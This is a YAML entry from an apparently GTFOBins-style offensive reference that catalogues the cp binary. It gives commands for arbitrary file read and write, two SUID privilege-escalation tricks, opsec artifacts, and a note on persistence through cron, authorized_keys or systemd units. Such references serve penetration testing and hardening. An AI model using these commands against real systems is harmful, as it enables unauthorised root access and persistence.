---
name: cp
capabilities:
- exec
- read
- write
- suid
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: cp /path/to/input-file /dev/stdout
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: echo DATA | cp /dev/stdin /path/to/output-file
- id: privilege-escalation
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: cp /path/to/input-file /path/to/output-file
  notes: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
- id: privilege-escalation-2
  description: Escalate to root via this binary.
  capabilities:
  - exec
  - suid
  command: cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
  notes: This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.
references:
- https://gtfobins.github.io/gtfobins/cp/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
